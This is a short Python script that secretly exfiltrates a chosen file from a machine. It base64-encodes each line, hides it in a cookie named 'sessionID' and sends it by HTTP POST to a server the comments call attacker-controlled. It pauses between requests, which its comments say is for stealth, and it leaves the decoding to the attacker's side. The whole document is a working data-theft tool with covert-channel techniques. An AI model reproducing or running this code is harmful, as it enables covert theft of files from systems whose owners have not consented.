import base64
import requests
import time
import sys

def usage():
	if len(sys.argv) != 3:
		print("Usage: <IP address of domain> <File to exfiltrate>")
		sys.exit(1)

# Read the target file and then print out each contents of it.
def process_file(target_file):
	with open(target_file) as fp:
		# Store each line in a list without new line trailings
		line_list = fp.read().splitlines()

	# return this list for further processing
	return line_list

# Specify the target domain which the attacker controls for exfil
def exfil_cookie(data, target_domain):
	# Access the cookie jar in which the data will be stored
	jar = requests.cookies.RequestsCookieJar()
	# Give the cookie an innocent name because stealth.
	jar.set('sessionID', data, domain=target_domain, path='/')
	# Request goes to attacker http server
	req = requests.post('http://%s:8080/' % target_domain, cookies=jar)

	# Each cookie which gets added is printed 
	for cookie in jar:
		# Base64 encoded lines of the target file which we print out
		print(cookie.value)
	# Return the cookie each time with a line of data
	return jar

# Base64 encoding function
def encode_data(data):
	data_bytes = data.encode('ascii')
	encoded_msg_bytes = base64.b64encode(data_bytes)
	encoded_msg = encoded_msg_bytes.decode('ascii')

	return encoded_msg

# Base64 decoding function
def decode_data(data):
	data_bytes = data.encode('ascii')
	decoded_msg_bytes = base64.b64decode(data_bytes)
	decoded_msg = decoded_msg_bytes.decode('ascii')

	return decoded_msg


def main():
	usage()
	attack_domain = sys.argv[1]
	file_name = sys.argv[2]

	try:
		target_file = process_file(file_name)
		# Get the for loop and then stick
		for line in target_file:
			base64_line = encode_data(line)
			exfil_cookie(base64_line, sys.argv[1])
			# Time between each cookie request made for stealth and performance purposes
			time.sleep(10)
	except Exception as e:
		print(e)

		#print("Decoded base64 data:",decode_data(encoded_line))
		# Decoding should be done at the attacker side by parsing the incoming network capture and then decoding the base64 stored cookie and store it to a file
main()
